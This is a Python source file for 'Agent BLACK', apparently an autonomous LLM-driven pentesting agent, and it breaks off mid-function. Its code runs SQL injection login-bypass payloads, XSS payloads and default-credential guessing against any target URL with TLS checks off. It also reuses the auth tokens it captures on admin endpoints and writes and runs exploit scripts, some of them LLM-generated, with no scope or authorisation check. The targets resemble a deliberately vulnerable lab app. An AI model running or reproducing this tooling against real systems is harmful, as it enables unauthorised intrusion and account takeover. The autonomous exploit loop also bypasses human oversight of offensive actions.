#!/usr/bin/env python3
import sys
import json
import asyncio
import tempfile
import subprocess
import re
import requests
import urllib3
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional

urllib3.disable_warnings()

sys.path.insert(0, str(Path(__file__).parent.parent))

from agents.agent_black import AgentBlack
from agent_black.auto_learn import auto_learner

REPORTS_DIR = Path(__file__).parent.parent.parent / "reports"
REPORTS_DIR.mkdir(exist_ok=True)


class AgentBlackAttack:
    def __init__(self, target: str):
        print("[*] Agent BLACK initializing...")
        self.agent = AgentBlack(load_model=False)
        self.target = target.rstrip("/")
        self.findings = []
        self.proofs = []
        
    def analyze(self):
        print(f"\n{'='*70}")
        print("  PHASE 1: TARGET ANALYSIS")
        print(f"{'='*70}")
        
        strategy = self.agent.evolve_strategy({"type": "webapp", "url": self.target})
        print(f"[*] Target: {self.target}")
        print(f"[*] Recommended modules: {strategy.get('recommended_modules')}")
        
        analysis = self.agent.analyze_target(self.target)
        print(f"[*] Target type: {analysis.get('type')}")
        print(f"[*] Attack surface: {analysis.get('attack_surface')}")
        
        return strategy
    
    def recon(self):
        print(f"\n{'='*70}")
        print("  PHASE 2: RECONNAISSANCE")
        print(f"{'='*70}")
        
        endpoints = []
        api_paths = [
            "/api", "/rest", "/api/v1", "/api/v2",
            "/rest/user", "/rest/products", "/rest/admin",
            "/api/users", "/swagger.json", "/api-docs"
        ]
        
        print("[*] Enumerating API endpoints...")
        for path in api_paths:
            try:
                r = requests.get(f"{self.target}{path}", timeout=5, verify=False)
                if r.status_code in [200, 201, 401, 403]:
                    endpoints.append({"path": path, "status": r.status_code})
                    print(f"    [+] Found: {path} ({r.status_code})")
            except:
                pass
        
        print(f"\n[*] Found {len(endpoints)} API endpoints")
        return endpoints
    
    def exploit_sqli(self):
        print(f"\n{'='*70}")
        print("  PHASE 3: SQL INJECTION EXPLOITATION")
        print(f"{'='*70}")
        
        login_endpoints = ["/rest/user/login", "/api/Users/login", "/login"]
        payloads = auto_learner.get_best_payloads("sqli", limit=3) + [
            "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR '1'='1'--", "') OR ('1'='1",
        ]
        
        for endpoint in login_endpoints:
            print(f"\n[*] Testing: {endpoint}")
            for payload in payloads:
                try:
                    r = requests.post(
                        f"{self.target}{endpoint}",
                        json={"email": payload, "password": payload},
                        headers={"Content-Type": "application/json"},
                        timeout=10, verify=False
                    )
                    if r.status_code == 200:
                        data = r.json()
                        if data.get("authentication") or data.get("token") or "token" in str(data).lower():
                            print(f"\n    [!!!] CRITICAL: SQL INJECTION SUCCESS!")
                            print(f"    [+] Endpoint: {endpoint}")
                            print(f"    [+] Payload: {payload}")
                            print(f"    [+] Response: {json.dumps(data, indent=2)[:500]}")
                            
                            self.findings.append({
                                "type": "sqli", "severity": "CRITICAL",
                                "endpoint": endpoint, "payload": payload, "proof": data
                            })
                            auto_learner.record_successful_payload("sqli", payload, self.target, endpoint)
                            
                            if data.get("authentication", {}).get("token"):
                                self.proofs.append({
                                    "type": "auth_bypass",
                                    "token": data["authentication"]["token"],
                                    "user": data["authentication"].get("umail", "unknown")
                                })
                            return True
                    
                    if "sql" in r.text.lower() or "syntax" in r.text.lower():
                        print(f"    [+] SQL Error disclosed: {payload[:30]}")
                        self.findings.append({"type": "sqli_error", "severity": "HIGH", "endpoint": endpoint, "payload": payload})
                except:
                    pass
        
        for endpoint in ["/rest/products/search", "/api/products/search"]:
            print(f"\n[*] Testing search: {endpoint}")
            try:
                r = requests.get(f"{self.target}{endpoint}?q=test'+OR+1=1--", timeout=10, verify=False)
                if any(x in r.text.lower() for x in ["sql", "syntax", "sqlite"]):
                    print(f"    [+] SQL Error in search!")
                    self.findings.append({"type": "sqli_search", "severity": "HIGH", "endpoint": endpoint})
            except:
                pass
        return len(self.findings) > 0
    
    def exploit_api(self):
        print(f"\n{'='*70}")
        print("  PHASE 4: API EXPLOITATION")
        print(f"{'='*70}")
        
        sensitive = [
            "/rest/admin/application-configuration", "/api/SecurityQuestions",
            "/rest/user/whoami", "/api/Feedbacks", "/rest/memories", "/api/Challenges",
        ]
        
        print("[*] Checking for sensitive data exposure...")
        for endpoint in sensitive:
            try:
                r = requests.get(f"{self.target}{endpoint}", timeout=5, verify=False)
                if r.status_code == 200 and len(r.text) > 50:
                    print(f"    [+] Exposed: {endpoint}")
                    try:
                        data = r.json()
                        if "data" in data or isinstance(data, list):
                            self.findings.append({
                                "type": "api_exposure", "severity": "MEDIUM",
                                "endpoint": endpoint, "sample": str(data)[:200]
                            })
                    except:
                        pass
            except:
                pass
        return len([f for f in self.findings if f.get("type") == "api_exposure"]) > 0
    
    def post_exploit(self):
        print(f"\n{'='*70}")
        print("  PHASE 5: POST-EXPLOITATION")
        print(f"{'='*70}")
        
        if not self.proofs:
            print("[*] No auth tokens obtained, skipping...")
            return
        
        for proof in self.proofs:
            if proof.get("token"):
                print(f"[*] Using captured token to access admin endpoints...")
                headers = {"Authorization": f"Bearer {proof['token']}"}
                
                for endpoint in ["/rest/admin/application-version", "/api/Users", "/rest/user/whoami"]:
                    try:
                        r = requests.get(f"{self.target}{endpoint}", headers=headers, timeout=5, verify=False)
                        if r.status_code == 200:
                            print(f"    [+] Accessed: {endpoint}")
                            try:
                                print(f"        Data: {str(r.json())[:200]}")
                            except:
                                pass
                    except:
                        pass
    
    def report(self):
        print(f"\n{'='*70}")
        print("  AGENT BLACK - ATTACK SUMMARY")
        print(f"{'='*70}")
        
        print(f"\n[*] Target: {self.target}")
        print(f"[*] Timestamp: {datetime.now().isoformat()}")
        print(f"\n[*] FINDINGS ({len(self.findings)}):")
        
        by_severity = {"CRITICAL": [], "HIGH": [], "MEDIUM": [], "LOW": [], "INFO": []}
        for f in self.findings:
            by_severity[f.get("severity", "INFO")].append(f)
        
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if by_severity[sev]:
                print(f"\n  [{sev}] - {len(by_severity[sev])} finding(s)")
                for f in by_severity[sev]:
                    print(f"    - {f.get('type')}: {f.get('endpoint', 'N/A')}")
                    if f.get('payload'):
                        print(f"      Payload: {f.get('payload')[:50]}")
        
        if self.proofs:
            print(f"\n[*] PROOFS OF COMPROMISE:")
            for p in self.proofs:
                print(f"    - {p.get('type')}: {p.get('user', 'unknown')}")
                if p.get('token'):
                    print(f"      Token: {p.get('token')[:50]}...")
        
        report_data = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "findings": self.findings,
            "proofs": self.proofs,
            "summary": {
                "critical": len(by_severity["CRITICAL"]),
                "high": len(by_severity["HIGH"]),
                "medium": len(by_severity["MEDIUM"]),
                "total": len(self.findings)
            }
        }
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        json_path = REPORTS_DIR / f"agent_black_attack_{timestamp}.json"
        with open(json_path, "w") as f:
            json.dump(report_data, f, indent=2)
        print(f"\n[+] JSON Report: {json_path}")
        
        html_path = REPORTS_DIR / f"agent_black_attack_{timestamp}.html"
        generate_full_html_report(report_data, html_path)
        print(f"[+] HTML Report: {html_path}")
        
        if self.findings:
            auto_learner.record_lesson(
                lesson=f"Found {len(self.findings)} vulnerabilities including {len(by_severity['CRITICAL'])} critical",
                target=self.target,
                techniques=[f.get("type") for f in self.findings]
            )
        return report_data
    
    def run(self):
        print(f"\n{'='*70}")
        print("  AGENT BLACK - AUTONOMOUS ATTACK")
        print(f"{'='*70}")
        print(f"  Target: {self.target}")
        print(f"  Mode: Autonomous Exploitation")
        print(f"{'='*70}")
        
        self.analyze()
        self.recon()
        self.exploit_sqli()
        self.exploit_api()
        self.post_exploit()
        return self.report()


def generate_full_html_report(data: dict, filepath: Path):
    import html as html_escape
    
    severity_colors = {"CRITICAL": "#dc3545", "HIGH": "#fd7e14", "MEDIUM": "#ffc107", "LOW": "#17a2b8", "INFO": "#6c757d"}
    
    findings_html = ""
    for i, f in enumerate(data.get("findings", []), 1):
        sev = f.get("severity", "INFO")
        color = severity_colors.get(sev, "#6c757d")
        details = ""
        if f.get("payload"):
            details += f'<p><strong>Payload:</strong> <code style="color:#ff6666;">{html_escape.escape(str(f.get("payload")))}</code></p>'
        if f.get("proof"):
            proof_str = json.dumps(f.get("proof"), indent=2)[:500]
            details += f'<details><summary style="cursor:pointer;color:#00d4ff;">View Proof</summary><pre style="background:#0a0a0f;padding:10px;border-radius:4px;">{html_escape.escape(proof_str)}</pre></details>'
        if f.get("sample"):
            details += f'<details><summary style="cursor:pointer;color:#00d4ff;">View Sample</summary><pre style="background:#0a0a0f;padding:10px;border-radius:4px;">{html_escape.escape(str(f.get("sample"))[:300])}</pre></details>'
        
        findings_html += f'''<div style="background:linear-gradient(135deg,#1a1a2e,#16213e);border-left:4px solid {color};border-radius:8px;padding:20px;margin-bottom:15px;">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
                <h3 style="margin:0;color:#fff;">#{i} {f.get("type","Unknown").upper()}</h3>
                <span style="background:{color};padding:5px 15px;border-radius:20px;font-weight:bold;">{sev}</span>
            </div>
            <p><strong>Endpoint:</strong> <code>{html_escape.escape(str(f.get("endpoint","N/A")))}</code></p>{details}
        </div>'''
    
    proofs_html = ""
    for p in data.get("proofs", []):
        token = (p.get("token", "")[:80] + "...") if len(p.get("token", "")) > 80 else p.get("token", "")
        proofs_html += f'''<div style="background:linear-gradient(135deg,#1a0a0a,#2e1616);border:1px solid #dc3545;border-radius:8px;padding:20px;margin-bottom:15px;">
            <h3 style="color:#ff6b6b;margin-bottom:10px;">🔓 {p.get("type","Auth Bypass").upper()}</h3>
            <p><strong>User:</strong> <code style="color:#00ff00;">{html_escape.escape(str(p.get("user","Unknown")))}</code></p>
            <p><strong>Token:</strong></p><pre style="background:#0a0a0f;padding:10px;border-radius:4px;overflow-x:auto;word-break:break-all;">{html_escape.escape(token)}</pre>
        </div>'''
    
    summary = data.get("summary", {})
    html = f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Agent BLACK Report - {html_escape.escape(data.get("target",""))}</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0f1a,#1a1a2e,#16213e);color:#e0e0e0;min-height:100vh;padding:20px}}
.container{{max-width:1200px;margin:0 auto}}.header{{background:linear-gradient(135deg,#1a1a2e,#0f3460);border-radius:15px;padding:30px;margin-bottom:30px;text-align:center;border:1px solid #2a2a4e}}
.header h1{{font-size:2.5em;background:linear-gradient(90deg,#00d4ff,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px}}
.stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:30px}}
.stat-card{{background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:10px;padding:20px;text-align:center;border:1px solid #2a2a4e}}
.stat-card h2{{font-size:2em;margin-bottom:5px}}.critical{{color:#dc3545}}.high{{color:#fd7e14}}.medium{{color:#ffc107}}
.section{{margin-bottom:30px}}.section h2{{color:#00d4ff;margin-bottom:20px;padding-bottom:10px;border-bottom:2px solid #2a2a4e}}
code{{background:#0a0a0f;padding:2px 6px;border-radius:4px;font-family:Consolas,monospace}}pre{{white-space:pre-wrap;word-wrap:break-word}}</style></head>
<body><div class="container">
    <div class="header"><h1>🕵️ AGENT BLACK</h1><p style="font-size:1.2em;color:#888;">Autonomous Attack Report</p>
        <p style="margin-top:15px;"><strong>Target:</strong> <code>{html_escape.escape(data.get("target",""))}</code></p>
        <p><strong>Timestamp:</strong> {data.get("timestamp","")}</p></div>
    <div class="stats">
        <div class="stat-card"><h2 class="critical">{summary.get("critical",0)}</h2><p>Critical</p></div>
        <div class="stat-card"><h2 class="high">{summary.get("high",0)}</h2><p>High</p></div>
        <div class="stat-card"><h2 class="medium">{summary.get("medium",0)}</h2><p>Medium</p></div>
        <div class="stat-card"><h2 style="color:#00ff00;">{summary.get("total",0)}</h2><p>Total</p></div>
        <div class="stat-card"><h2 style="color:#ff6b6b;">{len(data.get("proofs",[]))}</h2><p>Compromised</p></div>
    </div>
    {"<div class='section'><h2>🔓 Proofs of Compromise</h2>"+proofs_html+"</div>" if proofs_html else ""}
    <div class="section"><h2>🔍 Findings ({summary.get("total",0)})</h2>{findings_html if findings_html else "<p>No vulnerabilities found.</p>"}</div>
    <div style="text-align:center;padding:20px;color:#666;"><p>Generated by Agent BLACK - LANTERN Security Framework</p></div>
</div></body></html>'''
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)


class AutonomousBlack:
    def __init__(self, load_model: bool = False):
        print("[*] Initializing Autonomous Agent BLACK...")
        self.agent = AgentBlack(load_model=load_model)
        self.target = None
        self.objective = None
        self.findings = []
        self.actions_taken = []
        self.scripts_created = []
        self.scan_results = {}
        self.exploits_attempted = []
        self.max_iterations = 10
        
    def think(self, context: str) -> str:
        prompt = f"""You are Agent BLACK, an autonomous pentester.

Current target: {self.target}
Objective: {self.objective}
Actions taken: {json.dumps(self.actions_taken[-5:], indent=2) if self.actions_taken else 'None'}
Findings so far: {json.dumps(self.findings[-10:], indent=2) if self.findings else 'None'}
Scan results summary: {self._summarize_scan_results()}

Context: {context}

What should be the next action? Respond with ONE of:
- SCAN: <modules> - Run LANTERN scan (e.g., SCAN: sqli,xss,api)
- PROBE: <endpoint> - Test specific endpoint
- EXPLOIT: <vuln_type>:<target_endpoint> - Execute exploit
- EXTRACT: <what> - Extract data/proof
- COMPLETE: <summary> - Objective achieved
- FAILED: <reason> - Cannot proceed

Respond with just the action line."""

        if self.agent.model_loaded and self.agent.llm:
            try:
                response = self.agent.llm(prompt, max_tokens=200, stop=["\n\n"])
                if response and response.get("choices"):
                    return response["choices"][0]["text"].strip()
            except:
                pass
        return "SCAN: sqli,xss,headers,api,disclosure"
    
    def _summarize_scan_results(self) -> str:
        if not self.scan_results:
            return "No scans run yet"
        
        summary = []
        findings = self.scan_results.get("findings", [])
        
        critical = [f for f in findings if f.get("severity") == "CRITICAL"]
        high = [f for f in findings if f.get("severity") == "HIGH"]
        medium = [f for f in findings if f.get("severity") == "MEDIUM"]
        
        if critical:
            summary.append(f"CRITICAL: {len(critical)} ({', '.join(f.get('module', 'unknown') for f in critical[:3])})")
        if high:
            summary.append(f"HIGH: {len(high)} ({', '.join(f.get('module', 'unknown') for f in high[:3])})")
        if medium:
            summary.append(f"MEDIUM: {len(medium)}")
        
        return " | ".join(summary) if summary else "No significant findings"
    
    def run_lantern_scan(self, modules: str) -> Dict[str, Any]:
        print(f"\n    [*] Running LANTERN scan: {modules}")
        
        lantern_path = Path(__file__).parent.parent.parent / "lantern"
        report_name = f"autonomous_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        report_path = Path(__file__).parent.parent.parent / "reports" / f"{report_name}.json"
        
        cmd = [
            sys.executable, str(lantern_path),
            "-t", self.target,
            "-m", modules,
            "-o", report_name,
            "--format", "json",
            "--threads", "10",
            "--timeout", "30"
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,
                cwd=str(lantern_path.parent),
                encoding="utf-8",
                errors="replace"
            )
            
            print(result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout)
            
            if report_path.exists():
                with open(report_path) as f:
                    self.scan_results = json.load(f)
                    
                findings_count = len(self.scan_results.get("findings", []))
                print(f"    [+] Scan complete: {findings_count} findings")
                
                auto_learner.process_scan_results(self.scan_results, self.target)
                
                return {"success": True, "findings": findings_count, "results": self.scan_results}
            else:
                return {"success": False, "error": "No report generated"}
                
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Scan timed out"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def probe_endpoint(self, endpoint: str) -> Dict[str, Any]:
        print(f"\n    [*] Probing endpoint: {endpoint}")
        
        code = f'''
import requests
import json

target = "{self.target.rstrip('/')}"
endpoint = "{endpoint}"
url = f"{{target}}{{endpoint}}"

print(f"[*] Probing {{url}}")

try:
    r = requests.get(url, timeout=10, verify=False)
    print(f"[+] Status: {{r.status_code}}")
    print(f"[+] Headers: {{dict(r.headers)}}")
    
    content_type = r.headers.get("content-type", "")
    if "json" in content_type:
        try:
            data = r.json()
            print(f"[+] JSON Response: {{json.dumps(data, indent=2)[:500]}}")
        except:
            print(f"[+] Body: {{r.text[:500]}}")
    else:
        print(f"[+] Body preview: {{r.text[:300]}}")
except Exception as e:
    print(f"[-] Error: {{e}}")
    
    try:
        r = requests.post(url, json={{}}, timeout=10, verify=False)
        print(f"[+] POST Status: {{r.status_code}}")
        print(f"[+] POST Response: {{r.text[:300]}}")
    except Exception as e2:
        print(f"[-] POST Error: {{e2}}")
'''
        return self._execute_script(code, f"probe_{endpoint}")
    
    def exploit_vulnerability(self, vuln_spec: str) -> Dict[str, Any]:
        parts = vuln_spec.split(":", 1)
        vuln_type = parts[0].strip().lower()
        endpoint = parts[1].strip() if len(parts) > 1 else "/"
        
        print(f"\n    [*] Exploiting {vuln_type} at {endpoint}")
        
        exploits = {
            "sqli": self._sqli_exploit,
            "xss": self._xss_exploit,
            "api": self._api_exploit,
            "auth": self._auth_exploit,
        }
        
        exploit_func = exploits.get(vuln_type, self._generic_exploit)
        return exploit_func(endpoint, vuln_type)
    
    def _sqli_exploit(self, endpoint: str, vuln_type: str) -> Dict[str, Any]:
        learned = auto_learner.get_best_payloads("sqli", limit=5)
        
        payloads = learned + [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "') OR ('1'='1",
        ]
        
        code = f'''
import requests
import json
import urllib3
urllib3.disable_warnings()

target = "{self.target.rstrip('/')}"
endpoint = "{endpoint}"

payloads = {json.dumps(payloads)}

print(f"[*] SQLi testing {{target}}{{endpoint}}")

for payload in payloads:
    print(f"\\n[*] Testing: {{payload[:50]}}")
    
    try:
        r = requests.post(
            f"{{target}}{{endpoint}}",
            json={{"email": payload, "password": payload}},
            headers={{"Content-Type": "application/json"}},
            timeout=10,
            verify=False
        )
        
        if r.status_code == 200:
            try:
                data = r.json()
                if data.get("authentication") or data.get("token") or "token" in r.text.lower():
                    print(f"[+] SQLI SUCCESS! Payload: {{payload}}")
                    print(f"[+] Response: {{json.dumps(data, indent=2)[:500]}}")
                    break
            except:
                pass
        
        if "error" in r.text.lower() and ("sql" in r.text.lower() or "syntax" in r.text.lower()):
            print(f"[+] SQL Error disclosed! Payload: {{payload}}")
            print(f"[+] Response: {{r.text[:300]}}")
            
    except Exception as e:
        print(f"[-] Error: {{e}}")

params_test = requests.get(f"{{target}}{{endpoint}}?q=' OR 1=1--", timeout=10, verify=False)
if "error" in params_test.text.lower() or params_test.status_code != 200:
    print(f"[+] GET param might be vulnerable")
    print(f"[+] Response: {{params_test.text[:200]}}")
'''
        result = self._execute_script(code, "sqli_exploit")
        
        if result.get("success") and "SQLI SUCCESS" in result.get("stdout", ""):
            self.findings.append({
                "type": "sqli",
                "severity": "CRITICAL",
                "endpoint": endpoint,
                "details": "SQL Injection confirmed"
            })
            
            payload_match = re.search(r"Payload: (.+)", result.get("stdout", ""))
            if payload_match:
                auto_learner.record_successful_payload("sqli", payload_match.group(1), self.target, endpoint)
        
        return result
    
    def _xss_exploit(self, endpoint: str, vuln_type: str) -> Dict[str, Any]:
        learned = auto_learner.get_best_payloads("xss", limit=3)
        
        payloads = learned + [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
        ]
        
        code = f'''
import requests
import urllib3
urllib3.disable_warnings()

target = "{self.target.rstrip('/')}"
endpoint = "{endpoint}"
payloads = {json.dumps(payloads)}

print(f"[*] XSS testing {{target}}{{endpoint}}")

for payload in payloads:
    try:
        r = requests.get(f"{{target}}{{endpoint}}?q={{payload}}", timeout=10, verify=False)
        if payload in r.text:
            print(f"[+] XSS REFLECTED! Payload: {{payload}}")
            break
    except Exception as e:
        print(f"[-] Error: {{e}}")
'''
        return self._execute_script(code, "xss_exploit")
    
    def _api_exploit(self, endpoint: str, vuln_type: str) -> Dict[str, Any]:
        code = f'''
import requests
import json
import urllib3
urllib3.disable_warnings()

target = "{self.target.rstrip('/')}"

api_endpoints = [
    "/api", "/api/v1", "/api/v2", "/rest",
    "/rest/user", "/rest/products", "/rest/admin",
    "/api/users", "/api/config", "/api/debug",
    "/swagger.json", "/openapi.json", "/api-docs",
    "{endpoint}"
]

print(f"[*] API enumeration on {{target}}")

for ep in api_endpoints:
    try:
        r = requests.get(f"{{target}}{{ep}}", timeout=5, verify=False)
        if r.status_code in [200, 201, 401, 403]:
            print(f"[+] Found: {{ep}} ({{r.status_code}})")
            if r.status_code == 200 and len(r.text) > 10:
                print(f"    Preview: {{r.text[:200]}}")
    except:
        pass
'''
        return self._execute_script(code, "api_exploit")
    
    def _auth_exploit(self, endpoint: str, vuln_type: str) -> Dict[str, Any]:
        code = f'''
import requests
import json
import urllib3
urllib3.disable_warnings()

target = "{self.target.rstrip('/')}"
endpoint = "{endpoint}"

creds = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("root", "root"),
    ("test", "test"),
    ("user", "user"),
    ("admin@juice-sh.op", "admin123"),
]

print(f"[*] Auth testing {{target}}{{endpoint}}")

for user, pwd in creds:
    try:
        r = requests.post(
            f"{{target}}{{endpoint}}",
            json={{"email": user, "password": pwd}},
            headers={{"Content-Type": "application/json"}},
            timeout=10,
            verify=False
        )
        
        if r.status_code == 200:
            data = r.json()
            if data.get("authentication") or data.get("token"):
                print(f"[+] VALID CREDS: {{user}}:{{pwd}}")
                print(f"[+] Response: {{json.dumps(data, indent=2)[:300]}}")
    except Exception as e:
        print(f"[-] Error with {{user}}: {{e}}")
'''
        return self._execute_script(code, "auth_exploit")
    
    def _generic_exploit(self, endpoint: str, vuln_type: str) -> Dict[str, Any]:
        if self.agent.model_loaded and self.agent.llm:
            code = self.agent.generate_exploit(vuln_type, self.target, {"endpoint": endpoint})
            if code:
                return self._execute_script(code, f"llm_{vuln_type}_exploit")
        
        return {"success": False, "error": f"No exploit available for {vuln_type}"}
    
    def _execute_script(self, code: str, name: str) -> Dict[str, Any]:
        script_path = Path(tempfile.gettempdir()) / f"black_{name}_{len(self.scripts_created)}.py"
        
        with open(script_path, "w") as f:
            f.write(code)
        
        self.scripts_created.append({
            "path": str(script_path),
            "name": name,
            "code": code[:500] + "..." if len(code) > 500 else code
        })
        
        try:
            result = subprocess.run(
                [sys.executable, str(script_path)],
                capture_output=True,
                text=True,
                timeout=120,
                encoding="utf-8",
                errors="replace"
            )
            
            output = result.stdout + result.stderr
            print(output)
            
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Script timed out"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def extract_proof(self, what: str) -> Dict[str, Any]:
        print(f"\n    [*] Extracting: {what}")
        
        code = f'''
import requests
import json
import urllib3
urllib3.disable_warnings()

target = "{self.target.rstrip('/')}"

print("[*] Extracting proof of compromise...")

endpoints = [
    "/rest/user/whoami",
    "/api/users",
    "/rest/products/1",
    "/api/me",
    "/rest/admin/application-configuration",
]

for ep in endpoints:
    try:
        r = requests.get(f"{{target}}{{ep}}", timeout=10, verify=False)
        if r.status_code == 200 and len(r.text) > 10:
            print(f"[+] {{ep}}:")
            print(json.dumps(r.json(), indent=2)[:500] if "json" in r.headers.get("content-type", "") else r.text[:500])
    except:
        pass
'''
        return self._execute_script(code, "extract_proof")
    
    async def autonomous_loop(self, target: str, objective: str):
        self.target = target
        self.objective = objective
        
        print("\n" + "=" * 70)
        print("  AGENT BLACK - AUTONOMOUS MODE")
        print("=" * 70)
        print(f"  Target: {target}")
        print(f"  Objective: {objective}")
        print("=" * 70)
        
        strategy = self.agent.evolve_strategy({"type": "web", "url": target})
        if strategy.get("attack_chain"):
            print(f"\n[*] Using learned attack chain: {strategy['attack_chain'].get('name')}")
        if strategy.get("recommendations"):
            print(f"[*] Recommendations: {', '.join(strategy['recommendations'][:3])}")
        
        print(f"\n[*] Starting with modules: {', '.join(strategy.get('recommended_modules', ['sqli']))}")
        
        iteration = 0
        completed = False
        
        while iteration < self.max_iterations and not completed:
            iteration += 1
            print(f"\n{'='*70}")
            print(f"  ITERATION {iteration}/{self.max_iterations}")
            print(f"{'='*70}")
            
            context = f"Iteration {iteration}. " 
            if not self.scan_results:
                context += "No scans run yet."
            elif not self.findings:
                context += f"Scan complete but no confirmed exploits yet. Scan found {len(self.scan_results.get('findings', []))} potential issues."
            else:
                context += f"Found {len(self.findings)} confirmed vulnerabilities."
            
            action = self.think(context)
            print(f"\n[THINK] {action}")
            
            self.actions_taken.append({
                "iteration": iteration,
                "action": action,
                "timestamp": datetime.now().isoformat()
            })
            
            if action.startswith("SCAN:"):
                modules = action.split(":", 1)[1].strip()
                result = self.run_lantern_scan(modules)
                
            elif action.startswith("PROBE:"):
                endpoint = action.split(":", 1)[1].strip()
                result = self.probe_endpoint(endpoint)
                
            elif action.startswith("EXPLOIT:"):
                vuln_spec = action.split(":", 1)[1].strip()
                result = self.exploit_vulnerability(vuln_spec)
                self.exploits_attempted.append(vuln_spec)
                
            elif action.startswith("EXTRACT:"):
                what = action.split(":", 1)[1].strip()
                result = self.extract_proof(what)
                
            elif action.startswith("COMPLETE:"):
                summary = action.split(":", 1)[1].strip()
                print(f"\n[+] OBJECTIVE ACHIEVED: {summary}")
                completed = True
                break
                
            elif action.startswith("FAILED:"):
                reason = action.split(":", 1)[1].strip()
                print(f"\n[-] CANNOT PROCEED: {reason}")
                break
            else:
                modules = strategy.get("recommended_modules", ["sqli", "xss", "api"])
                result = self.run_lantern_scan(",".join(modules[:5]))
            
            await asyncio.sleep(1)
        
        self._print_summary()
        self._save_engagement()
    
    def _print_summary(self):
        print("\n" + "=" * 70)
        print("  AUTONOMOUS ATTACK SUMMARY")
        print("=" * 70)
        print(f"\n  Target: {self.target}")
        print(f"  Objective: {self.objective}")
        print(f"  Iterations: {len(self.actions_taken)}")
        print(f"  Scripts executed: {len(self.scripts_created)}")
        
        if self.findings:
            print(f"\n  CONFIRMED VULNERABILITIES ({len(self.findings)}):")
            for f in self.findings:
                print(f"    - [{f.get('severity', 'UNKNOWN')}] {f.get('type', 'unknown')}: {f.get('details', '')[:50]}")
        
        if self.scan_results.get("findings"):
            findings = self.scan_results["findings"]
            by_severity = {}
            for f in findings:
                sev = f.get("severity", "INFO")
                by_severity[sev] = by_severity.get(sev, 0) + 1
            print(f"\n  SCAN FINDINGS: {by_severity}")
        
        if self.exploits_attempted:
            print(f"\n  EXPLOITS ATTEMPTED: {', '.join(self.exploits_attempted)}")
    
    def _save_engagement(self):
        engagement = {
            "timestamp": datetime.now().isoformat(),
            "target": self.target,
            "objective": self.objective,
            "findings": self.findings,
            "actions": self.actions_taken,
            "scan_summary": {
                "total_findings": len(self.scan_results.get("findings", [])),
                "by_severity": {}
            },
            "scripts_executed": len(self.scripts_created),
            "exploits_attempted": self.exploits_attempted
        }
        
        for f in self.scan_results.get("findings", []):
            sev = f.get("severity", "INFO")
            engagement["scan_summary"]["by_severity"][sev] = engagement["scan_summary"]["by_severity"].get(sev, 0) + 1
        
        engagements_dir = Path(__file__).parent.parent / "labs"
        engagements_dir.mkdir(exist_ok=True)
        engagements_file = engagements_dir / "engagements.json"
        
        existing = []
        if engagements_file.exists():
            try:
                with open(engagements_file) as f:
                    existing = json.load(f)
            except:
                pass
        
        existing.append(engagement)
        
        with open(engagements_file, "w") as f:
            json.dump(existing, f, indent=2)
        
        print(f"\n  [+] Engagement saved to {engagements_file}")
        
        if self.findings:
            chain_steps = [a["action"] for a in self.actions_taken if a["action"].startswith(("SCAN:", "EXPLOIT:"))]
            auto_learner.record_attack_chain(
                name=f"autonomous_{datetime.now().strftime('%Y%m%d')}",
                steps=chain_steps,
                target=self.target,
                outcome=f"Found {len(self.findings)} vulnerabilities"
            )


def generate_html_report(data: dict, filepath: Path):
    import html as html_escape
    
    severity_colors = {"CRITICAL": "#dc3545", "HIGH": "#fd7e14", "MEDIUM": "#ffc107", "LOW": "#17a2b8", "INFO": "#6c757d"}
    
    findings_html = ""
    for i, f in enumerate(data.get("findings", []), 1):
        sev = f.get("severity", "INFO")
        color = severity_colors.get(sev, "#6c757d")
        details = f'<p><strong>Payload:</strong> <code style="color:#ff6666;">{html_escape.escape(str(f.get("payload", "")))}</code></p>' if f.get("payload") else ""
        findings_html += f'''<div style="background:linear-gradient(135deg,#1a1a2e,#16213e);border-left:4px solid {color};border-radius:8px;padding:20px;margin-bottom:15px;">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
                <h3 style="margin:0;color:#fff;">#{i} {f.get("type","Unknown").upper()}</h3>
                <span style="background:{color};padding:5px 15px;border-radius:20px;font-weight:bold;">{sev}</span>
            </div>
            <p><strong>Endpoint:</strong> <code>{html_escape.escape(str(f.get("endpoint","N/A")))}</code></p>{details}
        </div>'''
    
    proofs_html = ""
    for p in data.get("proofs", []):
        token = (p.get("token", "")[:80] + "...") if len(p.get("token", "")) > 80 else p.get("token", "")
        proofs_html += f'''<div style="background:linear-gradient(135deg,#1a0a0a,#2e1616);border:1px solid #dc3545;border-radius:8px;padding:20px;margin-bottom:15px;">
            <h3 style="color:#ff6b6b;margin-bottom:10px;">🔓 AUTH BYPASS</h3>
            <p><strong>User:</strong> <code style="color:#00ff00;">{html_escape.escape(str(p.get("user","Unknown")))}</code></p>
            <p><strong>Token:</strong></p><pre style="background:#0a0a0f;padding:10px;border-radius:4px;overflow-x:auto;word-break:break-all;">{html_escape.escape(token)}</pre>
        </div>'''
    
